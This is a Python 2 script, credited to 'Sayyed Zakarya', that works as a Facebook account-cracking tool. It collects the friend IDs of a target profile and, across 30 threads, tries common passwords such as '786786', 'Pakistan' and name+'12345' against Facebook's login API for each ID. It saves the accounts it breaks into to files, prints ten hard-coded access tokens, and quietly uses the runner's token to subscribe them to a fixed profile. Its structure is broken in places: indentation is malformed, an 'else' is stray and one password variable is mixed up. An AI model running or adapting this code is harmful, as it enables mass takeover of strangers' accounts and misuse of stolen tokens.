#coding:utf-8
#!/user/bin/python2
#coding by Zakarya
try:    
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 Fb2.py')
try:
    os.mkdir('Fb2')
except OSError:
    pass

from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-Telkomsel': repr(sim),'x-fb-net-Telkomsel': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE','user-agent':'Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

def exit():
    print '[!] Exit'
    os.sys.exit()
    
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
        return cetak(d)
        


#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:Sayyed_Zakarya
#### LOGO ####
logo = """                          
\033[1;94m  ___   _____  _     _  _     _  ___    ___   
\033[1;91m(  _ \(  _  )( )   ( )( )   ( )(  _ \ (  _ \ 
\033[1;92m | (_(_) (_) | \ \_/ /  \ \_/ / | (_(_)| | ) |
\033[1;93m  \__ \(  _  )   \ /      \ /   |  _)_ | | | )
\033[1;95m ( )_) | | | |   | |      | |   | (_( )| |_) |
\033[1;97m  \(___)_) (_)   (_)      (_)   (____/ (____/ 
\033[1;94m  (_)                                         
\033[1;96m
\033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
\033[1;97m                /(                                 
\033[1;94m               (__)                                                                            
"""
CorrectUsername = "Sayyed"
CorrectPassword = "Zakarya"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Sayyed_Zakarya
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
            else:
            	print "\033[1;97mWrong Username"
            os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
idh = []

def logmen():
    os.system('clear')
    print logo
    print ' [1] Login Token'
    print ' [\x1b[91m0\x1b[0m] Exit Tool'
    pilog()
def pilog():
    og = raw_input("\nSelect: ")
    if og =="1":
        os.system("clear")
        print logo
        print 
        print ("\033[1;92mCopy Token For Free From Sayyed Zakarya") 
        print (" ")
        print ("\033[1;92mToken No 1.  EAAAAUaZA8jlABAFJSFhiG1E3EhbRtzldAcYO2ZC0IFsRr0xXbtaBFBvajLoZA6h4ptDpgZBnxx7T7FaGtrWY6BZBDjkrmwVn85gpJZC7WUseC0SKqhuXWad8VLug8t6DPclZBKjIMsEByeQVU2tWb4e23cJ14aBvSrCGpDPMpmLwZAkNlejJDe0BlquZA8w6tyvcZD")
        print (" ")
        print ("\033[1;92mToken No 2.  EAAAAUaZA8jlABAJG16Q43JxgMU7ZCM15CfxarUlCKCOPja0vsgwL2wU8l9pccRJtSjHFQtl0VRe2wYTbX0Q4a2QHLSC3J8ERPdF9JnZARyqsBIjCHRnvJSSWLwa9r619dxFWpkZCHOfZCZAZCkW7YI6ahZAx7d6efkOn4OQ1fGflwfZA9yHPymaNgnvRwve3R7gwZD")
        print (" ")
        print ("\033[1;92mToken No 3.  EAAAAUaZA8jlABAAEZBfLBJqy1wcYLWoyTA7ybcUFBh8PivYocWqULQvLIO67AFUiEgXDOB3jXDmO1AfuCrwXHxZCyOxi2WrM6XE0ZCfZB8106w4X4JZCvZBWBrIlNFAy9ZC0iHJb5GbIpEJTS1cDcLAN8JiGohgSEeAp0NkPEZBF7qcXwCh2jDhD6PN29WZBmZB7M8")
        print (" ")
        print ("\033[1;92mToken No 4.  EAAAAUaZA8jlABAFQtEdT93913TLUr7amsfmhG626dHdiCS8TSTZCrS3WF75I6ws5DIhHRpfvZABsY3ZBZA8xtQBr07g1GlAgAm9fTPtWFZBkEPuRcSykoG29ps93FeyUPYLO9EZCmwJKaDC34Adtfw9UhwyZCAsAzsbg10x6AnF4ZAsjZCUVvKiqEkVlZCgiC4pq70ZD")
        print (" ")
        print ("\033[1;92mToken No 5.  EAAAAUaZA8jlABAFkG7vMxCYgTbJffsscQr81AZAGuUuI53rFtJw5l8d8B8KFZAZC6WaZBGNlEpeKr6vZBdAGtI1d4P7K1ZANqybcXiM6N3uYV7pj3OaZCcoEnXWcpcVdxgqaSvYZAvsvKjS5gy3RzqfidnJRAsDxrsu1zNS9NWdTPE0AzFThU1HZA2")
        print (" ")
        print ("\033[1;92mToken No 6.  EAAAAUaZA8jlABAEfw8ZB3QDG0S5JT1mhtrywBwqNfZAn6x2FzwwxGbi1LpdUjDvFZCd2D2fgvLFnnVPtVQZCbMb1fYqqT0Cps80c6F6Ol8OQbdcvXYHGGgReN9SBDU6zmlVZBWCj1ZBnxkZA239ZBZCJw56iiaemOrn5Ng9WaB79iLYxiCxN6iYd8EFnOLZCAfd58UZ")
        print (" ")
        print ("\033[1;92mToken No 7.  EAAAAUaZA8jlABAHwl2zyIWGPyQ588SFvkoV5YwxdGQiCb1FEGxnVP6RZCM8Mk34UsedfSRkcMSUeGFX79nu7E0guCmmRI2vtTqDOi8zoIIL506ZBNCRFhXq8srDL4aIwKJzepP9OYyQMJZClqsZBRNWKTPSF47ALYEhira99sZASVXbtaZBAzslUeY5KdZCCEGUZD")
        print (" ")
        print ("\033[1;92mToken No 8.  EAAAAUaZA8jlABADnu0YhuZAewgeVOcZCNf1tDxVWnMhiMF6wVOwHIMolqQZA8G3yLnhUOswVSY8rehNpldW2cWYYzXtqdE6eQtB0wfWVfqhd1ZBTBsdqFTkvzGXdL5hNqq9qjkIBPkRTvql5cZCy4ytbeEwWdaYUhwqj8OcBK42eV0AxRCvu1TvSxn3t4e4")
        print (" ")
        print ("\033[1;92mToken No 9.  EAAAAUaZA8jlABADE0UlMZB9sHz2mt1TO4UABZBGL68X3dk8XUmGvBf7KOpaBeZBPwMMQHDcQfuZCQwqLkXL8wCZCtazvLSimCQZCQbZChwzZAjJZBvma6HMemJp2GzyX00wvzY6wlbfJm7mGaktSEJXhGUKfXcoDofg4m7o0CPqJBekjGsoNiSTJpe1kAV5bnFANEZD")
        print (" ")
        print ("\033[1;92mToken No 10. EAAAAUaZA8jlABAGuUuqZCKpJlU9ZCJhHwuhyZCHsaBDjrxvuxMx6JHxdtQaTWg7HvEcMJBOPaw0Wo187IaVvP2Sx8CORxD2wD3FcYzYuqd0EFh2Rn8y8BVjYBjtlV3KOaWwmUwvuf3znjI3sdvjuuGGCm5T8GpVAAJgCgdnkBGlsMGFT6LFCjyhWTueN6c4ZD")
        print
                token = raw_input("[+] Past Your Token Here : ")
        sav = open(".logfuck.txt","w")
        sav.write(token)
        sav.close()
        print ("\r\033[1;32m[✓] Login Succesfully\033[0;97m")
        else:
        	os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
        time.sleep(1)
        bot_fl()
    elif og =="0":
        exit()
    else:
        print ("[!] Pilih Yang Bener Dong")
        pilog()
        
def bot_fl():
    try:
        token = open('.logfuck.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m   [!] Token invalid'
        os.system('rm -rf .logfuck.txt')
    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
    menu()
    
def menu():
    os.system("clear")
    try:
        token = open(".logfuck.txt","r").read()
    except IOError:
        print logo
        print("[!] token error. token not found")
        os.system("rm -rf .logfuck.txt")
        time.sleep(1)
        logmen()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        a = json.loads(r.text)
        name = a["name"]
    except KeyError:
        os.system("clear")
        print logo
        print("[!] Failed To Load. Your Checkpoint account")
        os.system("rm -rf .logfuck.txt")
        time.sleep(1)
        logmen()
    os.system("clear")
    print logo
    print("Welcome "+name)
    print ("Please select")
    print (" Don't Copy Me")
    print("[1] Start Cracking")
    print("[\x1b[91m0\x1b[0m] Exit")
    pil()
    
def pil():
    ti = raw_input('\nSelect: ')
    if ti =='1':
        cramen()
    elif ti =='0':
        os.system('rm -rf .logfuck.txt')
        print '[√] Deleting Token Successfully.'
        time.sleep(1)
        os.system('exit')
        logmen()
    else:
        print '[!] Pilih Yang Bener Dong'
        pil()
        
def cramen():
	global token
	os.system("clear")
	try:
		token=open(".logfuck.txt","r").read()
	except IOError:
		print("[!] Token Error. Token Not Working")
		os.system("rm -rf .logfuck.txt")
		time.sleep(1)
		logmen()
	os.system("clear")
	print logo
	print "[1] Crack ID Public"
	print '[\x1b[91m0\x1b[0m] Back'
	crapil()
	
def crapil():
	select = raw_input("\nSelect: ")
	id=[]
	oks=[]
	cps=[]
	if select=="10000":
		os.system("clear")
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for s in z["data"]:
			uid=s['id']
			na=s['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif select =="1":
		os.system("clear")
		print logo
		idt = raw_input("[+] Target ID : ")
		os.system("clear")
		print logo
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			print("[✓] Name : "+q["name"])
		except KeyError:
			print('\n[!] Fb ID . ID : '+idt+' Friends Not Public')
			raw_input("\nBack ")
			cramen()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	   
	elif select =="0":
		menu()
	else:
		print ("[!] Pilih Yang Bener Dong")
		crapil()
	print("[✓] Total ID : "+str(len(id)))
	time.sleep(0.5)
	print("PLEASE WAIT YOUR CLONING ACCOUNT WILL BE SHOW HERE")
	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1='786786'
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("Error "+uid+" | "+pass1+" --> CP")
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass1+" --> OK\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2="Pakistan"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("Error "+uid+" | "+pass2+" --> CP")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass2+" --> OK\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("Error "+uid+" | "+pass3+" --> CP")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass3+" --> OK\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"786"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("Error "+uid+" | "+pass4+" --> CP")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass4+" --> OK\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5=name+" 123"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("Error "+uid+" | "+pass5+" --> CP")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass5+" --> OK\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="Khan123"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("Error "+uid+" | "+pass6+" --> CP")
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass6+" --> OK\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7= "Ali12345"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("Error "+uid+" | "+pass7+" --> CP")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92mHack \033[1;30m"+uid+" | "+pass7+" --> OK\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('')
	print('[✓] Total CP/\033[1:32mOK:\033[0;97m  '+str(len(cps))+'/\033[;32m \033[0;97m'+str(len(oks)))
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mSayyed_Zakarya\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Sayyed-Zakarya--•◈•---»" #Dev:Sayyed-Zakarya
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
	raw_input('Back')
	menu()
    
if __name__ == '__main__':
	menu()
